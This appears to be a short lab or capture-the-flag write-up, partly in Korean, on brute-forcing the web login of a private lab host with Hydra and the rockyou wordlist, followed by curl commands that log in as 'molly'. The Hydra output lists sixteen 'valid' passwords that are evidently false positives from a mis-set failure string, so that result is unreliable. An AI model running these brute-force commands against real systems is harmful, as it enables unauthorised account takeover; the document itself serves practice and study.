# 10.201.20.141

hydra -l <username> -P <wordlist> 10.201.20.141 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

# hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.20.141 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."

┌──(root㉿docker-desktop)-[/usr/share/wordlists]
└─# hydra -l molly -P rockyou.txt 10.201.20.141 http-post-form "/login:username=^USER^&password=^PASS^: error."
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-25 14:46:22
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.201.20.141:80/login:username=^USER^&password=^PASS^: error.
[80][http-post-form] host: 10.201.20.141 login: molly password: iloveyou
[80][http-post-form] host: 10.201.20.141 login: molly password: monkey
[80][http-post-form] host: 10.201.20.141 login: molly password: 123456
[80][http-post-form] host: 10.201.20.141 login: molly password: password
[80][http-post-form] host: 10.201.20.141 login: molly password: princess
[80][http-post-form] host: 10.201.20.141 login: molly password: 1234567
[80][http-post-form] host: 10.201.20.141 login: molly password: 12345678
[80][http-post-form] host: 10.201.20.141 login: molly password: abc123
[80][http-post-form] host: 10.201.20.141 login: molly password: rockyou
[80][http-post-form] host: 10.201.20.141 login: molly password: 123456789
[80][http-post-form] host: 10.201.20.141 login: molly password: babygirl
[80][http-post-form] host: 10.201.20.141 login: molly password: lovely
[80][http-post-form] host: 10.201.20.141 login: molly password: jessica
[80][http-post-form] host: 10.201.20.141 login: molly password: daniel
[80][http-post-form] host: 10.201.20.141 login: molly password: 12345
[80][http-post-form] host: 10.201.20.141 login: molly password: nicole
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-25 14:46:27

![](https://velog.velcdn.com/images/agnusdei1207/post/74e3aad2-1654-40b8-b6c9-267a4640d594/image.png)

# curl -c cookie.txt -s -X GET http://10.201.20.141/login && curl -b cookie.txt -X POST http://10.201.20.141/login -d "username=molly&password=iloveyou" -i

# curl 명령어 옵션 상세 분석

## 명령어

```bash
curl -c cookie.txt -s -X GET http://10.201.20.141/login
curl -b cookie.txt -X POST http://10.201.20.141/login -d "username=molly&password=iloveyou" -i
```
